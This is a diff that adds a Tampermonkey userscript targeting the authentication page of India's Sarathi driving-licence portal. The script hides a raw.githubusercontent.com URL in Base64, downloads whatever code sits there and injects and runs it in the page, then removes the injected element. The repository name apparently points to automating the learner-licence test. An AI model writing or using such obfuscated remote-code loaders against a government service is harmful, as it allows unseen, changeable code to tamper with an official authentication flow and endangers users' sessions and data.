@@ -1,1 +1,46 @@
-OK
+// ==UserScript==
+// @name         Reload Code (Auto Console Run)
+// @namespace    http://tampermonkey.net/
+// @version      1.1
+// @description  Automatically fetch and execute remote script, logs to console
+// @match        https://sarathi.parivahan.gov.in/sarathiservice/authenticationaction.do*
+// @grant        none
+// @run-at       document-end
+// ==/UserScript==
+
+(function () {
+    'use strict';
+
+    // paste the Base64-encoded URL here (replace the placeholder below)
+    const scriptURLBase64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoaXZhNzY2OC9sbHNvbHV0aW9uYXV0by1WaW9sYXRpb24tcmVmcy1oZWFkcy1tYWluLXJlbG9hZC9tYWluL1JFQURNRS5tZA==";
+
+    // decode base64 -> original URL
+    const scriptURL = (function(base64) {
+        // for ASCII-only URLs this is fine:
+        try {
+            return atob(base64);
+        } catch (e) {
+            // fallback for non-ASCII (unlikely for raw.githubusercontent URLs)
+            return decodeURIComponent(Array.prototype.map.call(atob(base64), function(c) {
+                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+        }
+    })(scriptURLBase64);
+
+    console.log("[Tampermonkey] Fetching remote script from:", scriptURL);
+
+    fetch(scriptURL)
+        .then(response => {
+            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+            return response.text();
+        })
+        .then(code => {
+            console.log("[Tampermonkey] Executing remote script...");
+            const script = document.createElement('script');
+            script.textContent = code;
+            document.documentElement.appendChild(script);
+            script.remove();
+            console.log("[Tampermonkey] Script executed successfully ✅");
+        })
+        .catch(err => console.error("[Tampermonkey] Failed to load remote script:", err));
+})();
